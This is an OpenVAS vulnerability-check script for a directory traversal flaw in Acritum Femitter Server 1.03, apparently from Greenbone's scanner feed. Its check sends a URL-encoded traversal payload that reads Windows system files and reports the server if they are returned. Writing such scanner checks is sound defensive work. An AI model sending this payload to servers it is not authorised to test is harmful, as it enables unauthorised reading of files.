###############################################################################
# OpenVAS Vulnerability Test
#
# Acritum Femitter Server URI Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100590");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-04-21 13:10:07 +0200 (Wed, 21 Apr 2010)");
  script_bugtraq_id(39594);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Acritum Femitter Server URI Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39594");
  script_xref(name:"URL", value:"http://www.acritum.com/fem/index.htm");

  script_tag(name:"summary", value:"Acritum Femitter Server is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user- supplied input.");
  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary local
  files and directories within the context of the webserver. Information
  harvested may aid in launching further attacks.");
  script_tag(name:"affected", value:"Acritum Femitter Server 1.03 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

files = traversal_files( "windows" );

foreach file( keys( files ) ) {

  url = string("/////..%2f..%2f..%2f..%2f",files[file]);

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
